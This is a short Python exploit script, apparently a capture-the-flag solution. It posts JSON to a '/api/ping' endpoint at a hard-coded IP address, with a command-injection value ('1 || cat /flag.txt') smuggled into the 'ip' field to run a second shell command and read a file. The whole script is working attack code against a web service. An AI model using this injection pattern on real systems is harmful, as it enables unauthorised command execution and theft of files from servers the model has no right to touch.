import requests, json

target = 'http://46.101.80.159:30369'

data = {"ip" : "1 || cat /flag.txt"}
data = str(json.dumps(data))
request = requests.post(target + "/api/ping", data=data)

print(request.text)